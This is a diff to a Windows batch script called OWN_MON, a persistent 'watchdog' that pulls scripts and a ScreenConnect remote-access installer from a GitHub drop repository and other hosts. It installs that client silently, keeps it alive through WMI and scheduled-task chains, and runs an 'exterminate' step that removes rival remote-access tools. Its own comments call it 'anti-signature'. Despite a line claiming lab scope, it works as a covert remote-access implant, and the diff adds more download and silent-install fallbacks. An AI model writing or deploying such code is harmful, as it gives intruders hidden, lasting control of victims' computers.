@@ -1,6 +1,6 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260802M18
+rem  OWN_MON  BUILD 20260802M19
 rem  Persistent watchdog - identity-aware (anti-signature), mutual
 rem  WMI+schtasks chains, MSI fallback chain, state.json, digest HB.
 rem  Authorized internal deployment - lab/competition scope only.
@@ -23,15 +23,16 @@ set "OWNMON=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_mon.
 set "OWNMON2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_mon.cmd?t=%RANDOM%%RANDOM%"
 set "OWNLIB=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_lib.ps1?t=%RANDOM%%RANDOM%"
 set "OWNLIB2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_lib.ps1?t=%RANDOM%%RANDOM%"
-set "MSI_URL=https://sevrz.com/ScreenConnect.ClientSetup.msi"
+set "MSI_URL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
 set "MSI_PKG1=https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg.msi"
 set "MSI_PKG2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/pkg.msi"
 set "MSI=%ProgramData%\ScreenConnect.ClientSetup.msi"
+set "MSICACHE=%WD%\pkg.msi"
 
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M16"
+set "MONVER=M19"
 set "PF86=%ProgramFiles(x86)%"
 for /f "tokens=1-3 delims=/ " %%a in ("%date%") do set "DT=%date% %time%"
 echo.>>"%LOG%"
@@ -110,6 +111,7 @@ if exist "%WD%\own_lib.ps1" (
 rem ── [E] exterminate foreign SC + disallowed RMM (BEFORE heal/install,
 rem     so the SC installer custom action never collides with rivals) ──
 if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
+timeout /t 8 /nobreak >nul
 set "FOREIGN_LEFT=0"
 for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
   set "FP=%%a"
@@ -176,16 +178,42 @@ rem M12: FIRST repair the registered product (recreates service without
 rem touching the ALT instance); fresh msiexec install only as fallback.
 echo svc missing - heal begin>>"%LOG%"
 call :RepairRegistered "%KEEP_FP%"
+sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
+if not errorlevel 1 (
+  set "INSTALLED=1"
+  set "PRIM_OK=1"
+  goto :AfterHeal
+)
+rem refuse fresh /i if product still registered - Upgrade table can wipe ALT
+set "REGSTATE=unknown"
+if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP_FP%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
+if /I "!REGSTATE!"=="yes" (
+  echo primary_registered_skip_fresh_install>>"%LOG%"
+  goto :AfterHeal
+)
 if "%INSTALLED%"=="0" call :InstallMsi "%MSI_URL%" "main"
-if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG1?t=%RANDOM%" "github-pkg"
+if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG1%?t=%RANDOM%" "github-pkg"
 if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG2%" "jsdelivr-pkg"
 if "%INSTALLED%"=="0" (
+  rem prefer worker-cached .wucache\pkg.msi (same binary as deploy)
+  attrib -h -s -r "%MSICACHE%" >nul 2>&1
+  for %%F in ("%MSICACHE%") do if %%~zF GTR 1000000 (
+    echo wucache_pkg_retry>>"%LOG%"
+    attrib -h -s -r "%MSI%" >nul 2>&1
+    copy /y "%MSICACHE%" "%MSI%" >nul 2>&1
+  )
   for %%F in ("%MSI%") do if %%~zF GTR 1000000 (
     echo cache retry install>>"%LOG%"
     call :NoMsiPolicy
-    msiexec /i "%MSI%" /qn /norestart /L*v "%WD%\msi_heal.log" >nul 2>&1
+    msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal.log" >nul 2>&1
     set "MSIEXIT=!ERRORLEVEL!"
     echo cache msiexec exit=!MSIEXIT!>>"%LOG%"
+    if "!MSIEXIT!"=="1618" (
+      timeout /t 30 /nobreak >nul
+      msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal2.log" >nul 2>&1
+      set "MSIEXIT=!ERRORLEVEL!"
+      echo cache_retry1618_exit=!MSIEXIT!>>"%LOG%"
+    )
     call :WaitSvc
   )
 )
@@ -279,9 +307,16 @@ if errorlevel 1 if exist "%PF86%\ScreenConnect Client (%KEEP_FP%)" (
   rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
 )
 echo [%TAG%] msiexec install>>"%LOG%"
-msiexec /i "%MSI%" /qn /norestart /L*v "%WD%\msi_heal.log" >nul 2>&1
+msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal.log" >nul 2>&1
 set "MSIEXIT=!ERRORLEVEL!"
 echo [%TAG%] msiexec exit=!MSIEXIT!>>"%LOG%"
+if "!MSIEXIT!"=="1618" (
+  echo [%TAG%] msi_busy_retry>>"%LOG%"
+  timeout /t 30 /nobreak >nul
+  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal2.log" >nul 2>&1
+  set "MSIEXIT=!ERRORLEVEL!"
+  echo [%TAG%] msiexec_retry exit=!MSIEXIT!>>"%LOG%"
+)
 call :WaitSvc
 exit /b 0
 
